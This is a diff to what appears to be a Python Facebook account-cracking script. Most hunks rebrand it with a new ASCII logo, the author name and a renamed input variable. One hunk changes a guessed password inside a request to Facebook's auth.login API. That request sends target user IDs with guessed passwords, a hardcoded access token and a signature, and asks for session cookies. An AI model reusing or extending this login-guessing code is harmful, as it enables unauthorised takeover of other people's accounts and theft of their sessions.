@@ -71,12 +71,13 @@ c3 = "\033[1;91m"
 logo = """                                          
 
                   
-╭━━╮╭━━━┳━━━┳╮╱╭┳━━╮
-┃╭╮┃┃╭━╮┃╭━╮┃┃╱┃┣┫┣╯
-┃╰╯╰┫╰━╯┃┃╱┃┃╰━╯┃┃┃
-┃╭━╮┃╭╮╭┫┃╱┃┃╭━╮┃┃┃
-┃╰━╯┃┃┃╰┫╰━╯┃┃╱┃┣┫┣╮
-╰━━━┻╯╰━┻━━━┻╯╱╰┻━━╯
+
+╭╮╭╮╭┳━━━┳╮╱╭┳━━┳━━━╮╭━━╮╭━━━┳━━━┳╮╱╭┳━━╮
+┃┃┃┃┃┃╭━╮┃┃╱┃┣┫┣┻╮╭╮┃┃╭╮┃┃╭━╮┃╭━╮┃┃╱┃┣┫┣╯
+┃┃┃┃┃┃┃╱┃┃╰━╯┃┃┃╱┃┃┃┃┃╰╯╰┫╰━╯┃┃╱┃┃╰━╯┃┃┃
+┃╰╯╰╯┃╰━╯┃╭━╮┃┃┃╱┃┃┃┃┃╭━╮┃╭╮╭┫┃╱┃┃╭━╮┃┃┃
+╰╮╭╮╭┫╭━╮┃┃╱┃┣┫┣┳╯╰╯┃┃╰━╯┃┃┃╰┫╰━╯┃┃╱┃┣┫┣╮
+╱╰╯╰╯╰╯╱╰┻╯╱╰┻━━┻━━━╯╰━━━┻╯╰━┻━━━┻╯╱╰┻━━╯
 
           
 
@@ -88,7 +89,7 @@ logo = """
 
 \033[1;96m(~)\033[1;97m Github : https://github.com/Wahidbaloch88
 
-\033[1;96m(~)\033[1;97m Fb     :  WAHID BAPOCH
+\033[1;96m(~)\033[1;97m Fb     :  WAHID BALOCH
 
                            
 
@@ -126,19 +127,19 @@ def main():
 
 def main_select():
 
-    Abdullah = raw_input("\033[1;97m[!] Select --->\033[1;96m ")
+    Wahid = raw_input("\033[1;97m[!] Select --->\033[1;96m ")
 
-    if Abdullah  =="1":
+    if Wahid  =="1":
 
         login()
 
-    if Abdullah =="2":
+    if Wahid =="2":
 
         os.system("xdg-open https://m.facebook.com/story.php?story_fbid=208660061173518&id=100060885769913")
 
 	main()  
 
-    elif Abdullah =="0":
+    elif Wahid =="0":
 
         os.system("exit")
 
@@ -178,9 +179,9 @@ def login():
 
 def login_select():
 
-    Abdullah = raw_input(" \033[1;97mOption :\033[1;96m ")
+    Wahid = raw_input(" \033[1;97mOption :\033[1;96m ")
 
-    if Abdullah =="1":
+    if Wahid =="1":
 
         os.system("clear")
 
@@ -762,7 +763,7 @@ def menu_select():
 
 		                                                else:
 
-		                                                    pass7="pubg@12"
+		                                                    pass7="ludostar1"
 
 		                                                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass7 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
 
